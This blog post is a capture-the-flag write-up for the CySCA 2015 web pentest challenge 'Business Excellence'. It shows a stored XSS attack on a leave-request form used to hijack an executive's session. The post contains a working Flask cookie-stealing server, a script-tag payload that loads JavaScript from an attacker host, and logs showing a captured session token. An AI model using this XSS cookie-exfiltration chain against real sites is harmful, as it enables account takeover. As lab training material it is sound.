---
title: CySCA 2015 - Web Application Pentest 4 - Business Excellence
author: nickw
layout: post

categories:
  - Blog
  - Security
---

<div style="font-size:0.7em"><i>Note: If you're interested in actually doing these challenges, <a href="/post/2015/cysca-web-pentest/">check out this post</a> on 
how to get the environment set up.</i>
</div>

* * *


We need to gain access to the CVO (Angelina's) account. In order to do this, we
most likely will need to steal a cookie. We take a look in the leave details 
section and put in a leave request to see if it's XSS protected. Additionally,
we notice that the session cookie on this website  *is not* `HTTPOnly`. Time
to steal.

The browser will prevent javascript accessing `HTTPOnly` cookies, hence, if it 
was HTTP Only, we would be looking in the wrong place. 

We do the naive thing and just put `<h1>Hello</h1>` in. However, the ticker spits 
out `WARNING: XSS detected! You have been reported.`. Additionally, it appears 
the XSS is stripped client side too. 

Lets take this to a [PostMan](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en) session rather than mucking around with 
request stripping. 

We also fire up a little flask web-app to steal the user's session. 

{% highlight python %}
from flask import Flask
import sys
app = Flask(__name__)

if len(sys.argv) < 3:
    print("Usage: {} <Listen IP Address> <Listen Port>".format(sys.argv[0]))
    print("Listen IP Must be a reachable machine IP from the box")
    exit(1)

host = sys.argv[1]; port = int(sys.argv[2])

@app.route('/')
def hello_world():
    return 'Hello World! <script src="http://{}:{}/r.js"></script>'.format(host,port)

@app.route('/r.js')
def steal():
    return """
    var url = 'http://{}:{}/url?'+ document.cookie;
    document.write('<img src="' + url +'" />');
    """.format(host, port)

if __name__ == '__main__':
    app.run(debug=True, port=port, host='0.0.0.0')

{% endhighlight %}

We send off the following request:

{% highlight text %}
POST /service/leave HTTP/1.1
Host: www.ecwi.cysca
Cache-Control: no-cache

start: 11/19/2015
end: 12/19/2015
reason: <Script src="http://x.x.x.x/r.js"></Script>
{% endhighlight %}

(Replacing x.x.x.x my your machine's accessible IP address)

We notice that the ticker says "WARNING: XSS detected! You have been reported." 
however, we still wait. Within 2 minutes, our javascript gets loaded, and we've
stolen the user's session cookie:

{% highlight text %}
192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /r.js HTTP/1.1" 200 -
192.168.8.6 - - [19/Nov/2015 17:58:01] "GET /url?session=eyJfZnJlc2giOnRydWUsIl9pZCI6eyIgYiI6IlltSmtNemxpT1RCbE56TTJNakkwTkRVMU0yTXpPVFZpTkRoa01tWm1Zek09In0sInVzZXJfaWQiOiI1In0.CS8EeQ.fNfERZulfSlUGpMSNEnsN2TBnzQ HTTP/1.1" 404 -
{% endhighlight %}

We replace our session cookie with this one, and now we've logged in, reavealing
the flag in the ticker:

> You're an Executive! - FLAG{3a000000000000000000000000000000}


